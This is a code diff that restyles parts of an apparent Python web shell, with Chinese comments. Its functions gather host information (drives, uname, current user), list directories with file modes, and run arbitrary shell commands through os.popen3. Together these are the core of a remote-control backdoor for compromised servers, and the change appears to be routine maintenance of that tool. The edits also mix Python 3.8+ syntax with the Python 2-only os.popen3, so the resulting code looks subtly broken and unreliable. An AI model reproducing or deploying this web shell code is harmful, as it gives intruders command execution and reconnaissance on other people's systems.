@@ -85,19 +85,18 @@ def BaseInfo():
     if(d == ""):
         d = os.getcwd()
     ret = "%s\t" % d
-    if(d.startswith('/')):
+    if (d.startswith('/')):
         ret += "/"
     else:
         for L in range(ord('C'), ord('Z') + 1):
-            if(os.path.isdir("%s:" % chr(L))):
-                ret += "%s:" % chr(L)
+            if os.path.isdir(f"{chr(L)}:"):
+                ret += f"{chr(L)}:"
     ret += "\t"
     ret += "%s\t" % ' '.join(platform.uname())
     if platform.system().lower() == 'windows':
         u = "Unknow" # windows 下没 pwd 使用 getpass.getuser 会出错
         for name in ('LOGNAME','USER','LNAME','USERNAME'):
-            user = os.environ.get(name)
-            if user:
+            if user := os.environ.get(name):
                 u = user
                 break
         ret += u
@@ -113,7 +112,7 @@ def FileTreeCode(d):
 '''
     ret = u""
     # 如果文件名/目录是中文,则需要 encode 成系统的编码后再去处理
-    if(os.path.exists(d.encode(ENCODE))):
+    if (os.path.exists(d.encode(ENCODE))):
         for fname in os.listdir(d.encode(ENCODE)):
             fname = fname.decode(ENCODE)
             p = os.path.join(d, fname)
@@ -122,9 +121,9 @@ def FileTreeCode(d):
                 name = fname
                 if stat.S_ISDIR(fst.st_mode):
                     name += "/"
-                ret += u"{}\t{}\t{}\t{}\n".format(name, TimeStampToTime(fst.st_mtime), fst.st_size, oct(fst.st_mode)[-4:])
+                ret += f"{name}\t{TimeStampToTime(fst.st_mtime)}\t{fst.st_size}\t{oct(fst.st_mode)[-4:]}\n"
             except:
-                ret += u"{}\t{}\t{}\t{}\n".format(fname, TimeStampToTime(0), 0, 0)
+                ret += f"{fname}\t{TimeStampToTime(0)}\t0\t0\n"
     else:
         ret = "ERROR:// Path Not Found or No Permission!"
     return ret.encode(ENCODE)
@@ -236,9 +235,9 @@ def ExecuteCommandCode(cmdPath, command):
         d = os.getcwd()
     cmd = []
     if d[0] == "/":
-        cmd = [cmdPath, '-c', '%s' % command]
+        cmd = [cmdPath, '-c', f'{command}']
     else:
-        cmd = '''%s /c "%s"''' % (cmdPath, command)
+        cmd = f'''{cmdPath} /c "{command}"'''
     c_stdin, c_stdout, c_stderr = os.popen3(cmd)
     c_stdin.close()
     result = c_stdout.read()
